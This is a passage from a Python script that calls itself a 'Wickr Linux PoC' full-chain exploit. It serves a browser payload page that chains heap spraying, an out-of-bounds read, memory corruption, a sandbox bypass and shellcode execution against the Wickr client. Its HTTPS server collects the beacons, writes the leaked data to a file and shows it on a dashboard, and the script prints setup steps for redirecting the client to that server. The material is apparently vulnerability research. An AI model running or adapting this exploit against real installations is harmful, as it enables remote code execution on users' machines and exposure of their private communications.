
if(wroteOK){{
  // === Execute ===
  const fret=payfn(0x1234);
  // Read back nonce from WASM memory via typed array
  const view=new Uint8Array(E.mem.buffer);
  const g32=(o)=>(view[o]|(view[o+1]<<8)|(view[o+2]<<16)|(view[o+3]<<24))>>>0;
  const rLo=g32(0x100),rHi=g32(0x104);
  const fLo=g32(0x108),fHi=g32(0x10c);
  const nLo=g32(0x110);
  _sync({{step:'EXEC',fret:fret,
    retaddr:_hx64(rHi,rLo),frameptr:_hx64(fHi,fLo),
    nonce:_hx(nLo),nonceOK:(nLo===0x13371339)}});
  _sync({{ts:new Date().toISOString(),
    result:(nLo===0x13371339)?'EXEC-OK':'EXEC-FAIL',
    wroteOK:wroteOK,nHits:hits.length}});
}}else{{
  _sync({{step:'DONE',result:'WRITE-FAIL',nHits:hits.length}});
}}

}} // hits.length > 0
}} // selfTestOK
}} // wrote && _cageOK

setTimeout(()=>location.reload(),3000);
}})();
"""

    return [head, wasm, chain, rce_setup, post_fire4]


def make_page(npad_val, spray_n, nelem, newlen, order=1, tickn=4, tickms=250):
    shellcode_hex = SHELLCODE.hex()
    parts = _js_payload(npad_val, spray_n, nelem, newlen, order, tickn, tickms, shellcode_hex)
    return '<!doctype html><html><body><script>\n' + '\n'.join(parts) + '\n</script></body></html>'


# Attempt schedule
def _build_attempts():
    a = []
    for i, (sp, ne) in enumerate([
        (12000, 320), (30000, 320), (12000, 640), (30000, 640),
        (12000, 320), (50000, 320), (30000, 320), (12000, 640),
        (30000, 320), (12000, 320),
    ]):
        nl = 0x8000  # 32KB OOB read
        a.append((4, sp, ne, nl, 1))
    return a

ATTEMPTS = _build_attempts()


class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
    def do_OPTIONS(self):
        self.send_response(204); self._cors(); self.end_headers()
    def do_GET(self):
        if self.path == "/log":
            if leaked:
                rows = []
                for i, item in enumerate(leaked):
                    step = item.get("step", item.get("result", "?"))
                    sample = ""
                    for k in ("sLen", "consistent", "walkOK", "memBI", "nonceOK", "result"):
                        if k in item: sample += f"{k}={item[k]} "
                    rows.append(f"<tr><td>{i}</td><td>{item.get('ts','?')[:19]}</td><td>{step}</td><td>{sample}</td></tr>")
                body = (f"<html><body style='font:14px monospace;background:#111;color:#0f0;padding:2em'>"
                        f"<h1>Wickr Linux PoC ({len(leaked)} beacons)</h1>"
                        f"<table border=1 cellpadding=4>{''.join(rows)}</table>"
                        f"</body></html>").encode()
            else:
                body = b"<html><body><h1>Waiting...</h1></body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self._cors(); self.end_headers()
            try: self.wfile.write(body)
            except: pass
        else:
            max_att = max((d.get("att", -1) for d in leaked), default=-1)
            att_idx = max_att + 1
            if att_idx >= len(ATTEMPTS):
                body = b"<html><body><h1>Done</h1></body></html>"
            else:
                npad, spray, nelem, newlen, order = ATTEMPTS[att_idx]
                body = make_page(npad, spray, nelem, newlen, order).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Content-Security-P",
                             "default-src * 'unsafe-inline' 'unsafe-eval'; connect-src * wickrweb://*; ")
            self._cors(); self.end_headers()
            try: self.wfile.write(body)
            except: pass
    def do_POST(self):
        if self.path == "/log":
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length) if length else b"{}"
            try: data = json.loads(raw)
            except: data = {"raw": raw.decode("utf-8", "replace")}
            leaked.append(data)
            with open(LEAK_FILE, "w") as f: json.dump(leaked, f, indent=2, ensure_ascii=False)
            step = data.get("step", data.get("result", "?"))
            extra = ""
            for k in ("sLen", "consistent", "walkOK", "wrote", "cageOK", "memBI", "nonceOK", "result"):
                if k in data: extra += f" {k}={data[k]}"
            print(f"  [{len(leaked):3d}] att={data.get('att','?')} {step}{extra}", flush=True)
            if data.get("result") in ("CHAIN-COMPLETE", "EXEC-OK", "EXEC-FAIL", "OVERLAP-MISS"):
                print(f"  >>> {data['result']} <<<", flush=True)
            body = b'{"ok":true}'
        else:
            body = b'{"err":"nf"}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self._cors(); self.end_headers()
        try: self.wfile.write(body)
        except: pass
    def log_message(self, *a): pass


class Srv(http.server.ThreadingHTTPServer):
    allow_reuse_address = False; daemon_threads = True


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 443
    cp, kp, certdir = make_cert()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(cp, kp)
    srv = Srv(("0.0.0.0", port), H)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print("=" * 60, flush=True)
    print(" Wickr Linux PoC — Self-contained full-chain (W77b + W67)", flush=True)
    print("=" * 60, flush=True)
    print(f" Listening  : https://{DOMAIN}:{port}/", flush=True)
    print(f" Dashboard  : https://{DOMAIN}:{port}/log", flush=True)
    print(f" Leak file  : {LEAK_FILE}", flush=True)
    print(f" Attempts   : {len(ATTEMPTS)}", flush=True)
    print()
    print("Chain: Fire1→Fire2→Fire3(rd64)→WALK→CORRUPT→CAGE→MEMBI→TPT", flush=True)
    print("      →Fire4→SELFTEST→SCAN→SHELLCODE→EXEC", flush=True)
    print()
    print("SETUP:", flush=True)
    print(f"  1. Add to hosts: 127.0.0.1 {DOMAIN}", flush=True)
    print(f"  2. Start this server", flush=True)
    print(f"  3. Open Wickr / harness", flush=True)
    print("=" * 60, flush=True)
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] shutting down...", flush=True)
    srv.shutdown()
    shutil.rmtree(certdir, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main() or 0)
